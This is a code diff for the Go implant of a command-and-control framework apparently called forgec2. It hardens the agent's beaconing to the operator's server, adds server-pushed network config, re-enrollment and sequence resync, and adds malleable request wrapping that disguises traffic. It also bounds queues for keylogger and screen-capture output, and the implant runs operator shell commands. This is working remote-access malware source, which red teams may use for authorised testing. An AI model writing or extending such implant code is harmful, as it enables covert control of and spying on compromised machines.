@@ -88,6 +88,10 @@ func init() {
 	// before any of the string vars are parsed below.
 	loadConfigBlob()
 
+	// Re-apply a previously delivered network config (config-over-wire) so the
+	// agent starts with the operator's last-known config before re-registering.
+	loadPersistedNetworkConfig()
+
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
 	parts := strings.Split(C2URL, ",")
@@ -104,12 +108,20 @@ func init() {
 	currentC2Idx = 0
 	var err error
 	Interval, err = strconv.Atoi(IntervalStr)
-	if err != nil {
+	if err != nil || Interval < 1 {
 		Interval = 10
 	}
 	Jitter, err = strconv.Atoi(JitterStr)
 	if err != nil {
 		Jitter = 20
+	}
+	// Clamp jitter to [0,100]% so a >100 value can never yield a negative
+	// sleep duration (which would panic time.NewTimer or cause a beacon storm).
+	if Jitter < 0 {
+		Jitter = 0
+	}
+	if Jitter > 100 {
+		Jitter = 100
 	}
 	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
 	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
@@ -123,7 +135,6 @@ func init() {
 	if BeaconTransport == "" {
 		BeaconTransport = "http"
 	}
-	beaconKey = BeaconKeyStr
 
 	// SMB pipe name: use explicit config or extract from C2URL
 	smbPipeName = SMBPipeName
@@ -325,7 +336,19 @@ func verifySelfIntegrity() {
 	if err != nil {
 		return
 	}
-	h := sha256.Sum256(data)
+	// The expected hash is of the binary EXCLUDING the embedded self-hash
+	// string itself (which the builder patches in after hashing). Locate the
+	// embedded hash region, zero it, and hash the rest so a tampered binary
+	// (any change outside that region) fails verification.
+	calc := make([]byte, len(data))
+	copy(calc, data)
+	needle := []byte(SelfCheckSHA256Str)
+	if idx := bytes.Index(calc, needle); idx >= 0 {
+		for i := idx; i < idx+len(needle) && i < len(calc); i++ {
+			calc[i] = 0
+		}
+	}
+	h := sha256.Sum256(calc)
 	actual := hex.EncodeToString(h[:])
 	if actual != SelfCheckSHA256Str {
 		os.Exit(1)
@@ -473,10 +496,7 @@ func main() {
 
 		// Exponential backoff on consecutive beacon failures
 		if beaconConsecutiveFailures > 0 {
-			backoffSec := 1 << uint(beaconConsecutiveFailures-1) // 1, 2, 4, 8, 16...
-			if backoffSec > 300 {
-				backoffSec = 300 // cap at 5 minutes
-			}
+			backoffSec := beaconBackoffSec(beaconConsecutiveFailures)
 			// Add jitter: ±25%
 			jitterRange := backoffSec / 4
 			if jitterRange > 0 {
@@ -508,6 +528,9 @@ func main() {
 				sleepDuration := timeUntilNextWindow()
 				if Debug {
 					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", workingStart, workingEnd, sleepDuration)
+				}
+				if sleepDuration < 0 {
+					sleepDuration = 0
 				}
 				time.Sleep(sleepDuration)
 				continue
@@ -584,6 +607,12 @@ func sleepWithJitter() {
 }
 
 func waitForBeaconWake(duration time.Duration) {
+	// Guard against non-positive durations (e.g. extreme negative jitter) which
+	// would panic time.NewTimer or busy-loop. Interactive fast mode legitimately
+	// passes sub-second values, so only floor at zero here.
+	if duration < 0 {
+		duration = 0
+	}
 	timer := time.NewTimer(duration)
 	defer timer.Stop()
 	select {
@@ -636,15 +665,25 @@ func registerOrGetUUID() string {
 	return newUUID
 }
 
-// getUUIDFilePath returns a less-obvious path for UUID persistence.
+// getUUIDFilePath returns a dedicated, agent-private path for UUID persistence.
+// It MUST NOT reuse or overwrite system files (e.g. /var/lib/dbus/machine-id or
+// the cfprefs plist): doing so corrupts host services and makes the agent UUID
+// predictable. The UUID lives in a hidden subdirectory of the user cache dir.
 func getUUIDFilePath() string {
-	if runtime.GOOS == "windows" {
-		return os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Crypto\\RSA\\S-1-5-21-0-0-0\\machineguid"
+	base, err := os.UserCacheDir()
+	if err != nil || base == "" {
+		if runtime.GOOS == "windows" {
+			base = os.Getenv("LOCALAPPDATA")
+		} else {
+			base = os.Getenv("HOME")
+		}
+		if base == "" {
+			base = "."
+		}
 	}
-	if runtime.GOOS == "darwin" {
-		return os.Getenv("HOME") + "/Library/Preferences/.cfprefsd.plist"
-	}
-	return "/var/lib/dbus/machine-id"
+	dir := filepath.Join(base, ".forgec2")
+	_ = os.MkdirAll(dir, 0o700)
+	return filepath.Join(dir, "agent.uuid")
 }
 
 // getBeaconStateFilePath returns the persistence path for v2 protocol state
@@ -687,6 +726,59 @@ func persistBeaconState() {
 	}
 }
 
+// reparseNetworkConfig re-derives the network-relevant runtime globals from the
+// current *Str values. It is called after a server-delivered network config
+// (config-over-wire) is applied so the changes take effect immediately. It only
+// touches the network globals — EDR/SSH/mTLS init is not delivered dynamically
+// and is intentionally left untouched.
+func reparseNetworkConfig() {
+	parts := strings.Split(C2URL, ",")
+	C2URLs = make([]string, 0, len(parts))
+	for _, p := range parts {
+		p = strings.TrimSpace(p)
+		if p != "" {
+			C2URLs = append(C2URLs, p)
+		}
+	}
+	if len(C2URLs) == 0 {
+		C2URLs = []string{C2URL}
+	}
+	currentC2Idx = 0
+	var err error
+	Interval, err = strconv.Atoi(IntervalStr)
+	if err != nil || Interval < 1 {
+		Interval = 10
+	}
+	Jitter, err = strconv.Atoi(JitterStr)
+	if err != nil {
+		Jitter = 20
+	}
+	if Jitter < 0 {
+		Jitter = 0
+	}
+	if Jitter > 100 {
+		Jitter = 100
+	}
+	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
+	BeaconURI = BeaconURIStr
+	if BeaconURI == "" {
+		BeaconURI = "/api/v1/beacon"
+	}
+	BeaconTransport = BeaconTransportStr
+	if BeaconTransport == "" {
+		BeaconTransport = "http"
+	}
+	if id, perr := strconv.ParseUint(ListenerIDStr, 10, 32); perr == nil {
+		ListenerID = uint(id)
+	}
+	smbPipeName = SMBPipeName
+	if smbPipeName == "" {
+		if Protocol == "smb" || strings.HasPrefix(C2URL, "smb://") {
+			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
+		}
+	}
+}
+
 // nextBeaconSeq allocates the next frame sequence number.
 func nextBeaconSeq() uint64 {
 	seqMu.Lock()
@@ -701,9 +793,7 @@ func startTaskWorker() {
 			for task := range taskQueue {
 				result := executeTask(task)
 				ensureResultID(&result)
-				pendingMu.Lock()
-				pendingResults = append(pendingResults, result)
-				pendingMu.Unlock()
+				enqueueResult(result)
 				inFastMode.Store(true)
 				select {
 				case beaconWake <- struct{}{}:
@@ -719,6 +809,46 @@ func enqueueTask(task Task) {
 	pendingMu.Lock()
 	pendingTaskAcks = append(pendingTaskAcks, task.ID)
 	pendingMu.Unlock()
+}
+
+const (
+	// maxPendingResults bounds the in-memory result queue. A high-volume
+	// producer (keylogger, screen capture, relayed frames) cannot grow memory
+	// without bound; when full the oldest result is dropped.
+	maxPendingResults = 1024
+	// maxPendingResultBytes drops a single oversized result (e.g. a multi-MB
+	// screenshot) outright so it cannot produce a beacon the server rejects.
+	maxPendingResultBytes = 16 * 1024 * 1024
+	// maxP2PChildFrames / maxP2PChildFrameBytes bound the per-child relay queue.
+	maxP2PChildFrames     = 256
+	maxP2PChildFrameBytes = 8 * 1024 * 1024
+)
+
+// enqueueResult appends a task result to the pending queue, bounding it so a
+// high-volume producer cannot exhaust memory. When the queue is full the oldest
+// result is dropped; a single result larger than maxPendingResultBytes is
+// dropped outright (it would otherwise build a beacon the server rejects).
+func enqueueResult(r TaskResult) {
+	pendingMu.Lock()
+	defer pendingMu.Unlock()
+	if len(r.Output) > maxPendingResultBytes {
+		if Debug {
+			fmt.Printf("[!] dropping oversized task result (type=%s size=%d)\n", r.Type, len(r.Output))
+		}
+		return
+	}
+	if len(pendingResults) >= maxPendingResults {
+		pendingResults = pendingResults[1:]
+	}
+	pendingResults = append(pendingResults, r)
+}
+
+// enqueueResults appends several results, applying the same bounds as
+// enqueueResult to each.
+func enqueueResults(results []TaskResult) {
+	for _, r := range results {
+		enqueueResult(r)
+	}
 }
 
 func availableTaskCapacity() int {
@@ -769,12 +899,10 @@ func doBeacon() {
 		peerTableMu.RUnlock()
 		if len(peers) > 0 {
 			if data, err := json.Marshal(peers); err == nil {
-				pendingMu.Lock()
-				pendingResults = append(pendingResults, TaskResult{
+				enqueueResult(TaskResult{
 					Type:   "gossip_discover",
 					Output: string(data),
 				})
-				pendingMu.Unlock()
 				lastGossipReport = time.Now()
 			}
 		}
@@ -867,14 +995,14 @@ func doBeacon() {
 		pendingResults = append(resultsCopy, pendingResults...)
 		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
 		pendingMu.Unlock()
-		// If the server rejected/never saw the frame and our persisted sequence
-		// was lost, jump the counter once per failure streak so a stale local
-		// seq can't lock us into permanent replay rejection.
-		if beaconConsecutiveFailures == 0 {
-			seqMu.Lock()
-			beaconSeq += 1000
-			seqMu.Unlock()
-		}
+		// If the server never saw the frame (transport failure) our persisted
+		// sequence may need to move forward. Advance by a small bounded step
+		// (never the old +1000, which could itself exceed the replay-jump cap
+		// and trip a permanent lockout). A genuine behind-the-server desync is
+		// corrected by the server's signed last_seq resync, not by jumping.
+		seqMu.Lock()
+		beaconSeq += 8
+		seqMu.Unlock()
 		beaconConsecutiveFailures++
 		if Debug {
 			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
@@ -890,10 +1018,12 @@ func doBeacon() {
 	switch frameKind {
 	case agentFrameRegister, agentFrameHandshake:
 		var authResp struct {
-			Seq     uint64 `json:"seq"`
-			RegOK   bool   `json:"reg_ok"`
-			ECDHPub string `json:"ecdh_pub"`
-			Mac     string `json:"mac"`
+			Seq           uint64 `json:"seq"`
+			RegOK         bool   `json:"reg_ok"`
+			ECDHPub       string `json:"ecdh_pub"`
+			Mac           string `json:"mac"`
+			Reregister    bool   `json:"reregister"`
+			NetworkConfig string `json:"network_config"`
 		}
 		if err := json.Unmarshal(respBody, &authResp); err != nil {
 			if Debug {
@@ -917,6 +1047,21 @@ func doBeacon() {
 			}
 			return
 		}
+		if authResp.Reregister {
+			// The server lost our registration (e.g. the implant row was deleted
+			// server-side). Re-enroll with a fresh registration frame on the next
+			// beacon — we still hold the identity key locally.
+			seqMu.Lock()
+			registered = false
+			seqMu.Unlock()
+			persistBeaconState()
+			inFastMode.Store(true)
+			return
+		}
+		// Apply any server-delivered network config (encrypted under our
+		// per-implant secret). The response MAC already authenticated the frame,
+		// so the config is trustworthy.
+		applyServerNetworkConfig(authResp.NetworkConfig)
 		if err := ecdhSess.establishFromServerKey(authResp.ECDHPub); err != nil {
 			if Debug {
 				log.Printf("[!] ECDH handshake completion failed: %v", err)
@@ -943,6 +1088,9 @@ func doBeacon() {
 			return
 		}
 		if env.CipherB64 == "" {
+			// No ciphertext: this may be a server resync signal (our sequence
+			// fell behind). Apply it if the MAC verifies, otherwise ignore.
+			tryResync(respBody)
 			return
 		}
 		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
@@ -959,6 +1107,15 @@ func doBeacon() {
 		}
 		if err := decodeBeacon(plaintext, &resp); err != nil {
 			return
+		}
+		// Fast-forward if the server is ahead of us (guards against a desync
+		// where our persisted sequence drifted behind the server's last_seq).
+		if resp.LastSeq > 0 {
+			seqMu.Lock()
+			if resp.LastSeq >= beaconSeq {
+				beaconSeq = resp.LastSeq + 1
+			}
+			seqMu.Unlock()
 		}
 		if resp.Rekey {
 			seqMu.Lock()
@@ -1030,6 +1187,9 @@ func sendToC2(idx int, body []byte) []byte {
 	if method == "" {
 		method = "POST"
 	}
+	// Apply request-side malleable transforms to the outbound body so the
+	// server can strip them on inbound; the enclosed envelope is unchanged.
+	body = wrapMalleableRequest(body)
 	req, err := http.NewRequest(method, url+beaconURI, bytes.NewReader(body))
 	if err != nil {
 		return nil
@@ -1037,6 +1197,14 @@ func sendToC2(idx int, body []byte) []byte {
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
 	for k, v := range getActiveHeaders() {
+		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
+			continue
+		}
+		req.Header.Set(k, v)
+	}
+	// Request-side malleable headers (e.g. Host/Cookie shaping). These are
+	// benign to the server's JSON parsing; they simply ride along on the request.
+	for k, v := range MalleableRequestHeaders {
 		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
 			continue
 		}
@@ -1092,6 +1260,24 @@ func stripMalleableWrapping(data []byte) []byte {
 	default:
 		data = bytes.TrimPrefix(data, []byte(MalleablePrepend))
 		return bytes.TrimSuffix(data, []byte(MalleableAppend))
+	}
+}
+
+// wrapMalleableRequest applies the request-side malleable transforms
+// (prepend/append) to the agent's OUTGOING beacon body. The server strips this
+// wrapping on inbound (stripMalleableRequest), so the JSON envelope it encloses
+// is delivered unchanged. Binary/length-prefixed transports do not call this.
+func wrapMalleableRequest(body []byte) []byte {
+	switch {
+	case MalleableRequestPrepend == "" && MalleableRequestAppend == "":
+		return body
+	case MalleableRequestPrepend == "":
+		return append(body, []byte(MalleableRequestAppend)...)
+	case MalleableRequestAppend == "":
+		return append([]byte(MalleableRequestPrepend), body...)
+	default:
+		out := append([]byte(MalleableRequestPrepend), body...)
+		return append(out, []byte(MalleableRequestAppend)...)
 	}
 }
 
@@ -1155,6 +1341,44 @@ func sendTCPBeacon(body []byte) []byte {
 		return nil
 	}
 	return rbuf
+}
+
+// tryResync applies a server resync signal: a plaintext, MAC-signed envelope
+// carrying the server's current last_seq. If the MAC verifies and the server is
+// ahead, the local counter is fast-forwarded so subsequent beacons are accepted
+// instead of being permanently rejected as replays.
+func tryResync(body []byte) {
+	var r struct {
+		Seq     uint64 `json:"seq"`
+		ECDHPub string `json:"ecdh_pub"`
+		Mac     string `json:"mac"`
+		LastSeq uint64 `json:"last_seq"`
+	}
+	if err := json.Unmarshal(body, &r); err != nil {
+		return
+	}
+	if r.ECDHPub == "" || r.Mac == "" {
+		return
+	}
+	if !verifyResponseMAC(r.Seq, r.ECDHPub, r.Mac) {
+		if Debug {
+			log.Printf("[!] resync response MAC mismatch, ignoring")
+		}
+		return
+	}
+	seqMu.Lock()
+	behind := r.LastSeq > beaconSeq
+	if behind {
+		beaconSeq = r.LastSeq + 1
+	}
+	seqMu.Unlock()
+	if behind {
+		persistBeaconState()
+		inFastMode.Store(true)
+		if Debug {
+			log.Printf("[*] resynced sequence to %d (server last_seq=%d)", beaconSeq, r.LastSeq)
+		}
+	}
 }
 
 // verifyResponseMAC checks the server's authentication response MAC:
@@ -1225,6 +1449,10 @@ func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq
 		if agentRegKey == nil {
 			return nil, 0, 0, false
 		}
+		// v3: carry the per-implant secret id so the server can authenticate the
+		// handshake against the secret store even if the implant row was deleted
+		// server-side. This is what lets a v3 agent recover after row deletion.
+		env.SecretID = RegSecretIDStr
 		env.Mac = base64.StdEncoding.EncodeToString(computeFrameMAC(agentRegKey, agentUUID, env.ECDHPub, strconv.FormatInt(ts, 10), strconv.FormatUint(seq, 10)))
 	default:
 		kind = agentFrameEncrypted
@@ -1269,9 +1497,7 @@ func sendTaskResult(res TaskResult) {
 	ready := registered && !rekeyRequested
 	seqMu.Unlock()
 	if ecdhSess == nil || ecdhSess.needsHandshake() || !ready {
-		pendingMu.Lock()
-		pendingResults = append(pendingResults, res)
-		pendingMu.Unlock()
+		enqueueResult(res)
 		inFastMode.Store(true)
 		return
 	}
@@ -1287,9 +1513,7 @@ func sendTaskResult(res TaskResult) {
 	// rather than transmitting it in clear.
 	sendBody, kind, _, ok := buildBeaconEnvelope(body)
 	if !ok || kind != agentFrameEncrypted {
-		pendingMu.Lock()
-		pendingResults = append(pendingResults, res)
-		pendingMu.Unlock()
+		enqueueResult(res)
 		inFastMode.Store(true)
 		return
 	}
@@ -1410,6 +1634,25 @@ func runShell(cmdStr, shell string) (string, error) {
 	cmd.Stderr = &out
 	err := cmd.Run()
 	return decodeShellOutput(out.Bytes(), shell), err
+}
+
+// beaconBackoffSec returns the base backoff (seconds) for a given number of
+// consecutive beacon failures. The exponent is clamped so the left shift can
+// never overflow int64 (1<<63 at 64 failures) and the result stays positive
+// and bounded by the 300s ceiling.
+func beaconBackoffSec(failures int) int {
+	if failures <= 0 {
+		return 0
+	}
+	exp := failures - 1
+	if exp > 9 {
+		exp = 9
+	}
+	backoff := 1 << uint(exp)
+	if backoff > 300 {
+		backoff = 300
+	}
+	return backoff
 }
 
 // setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
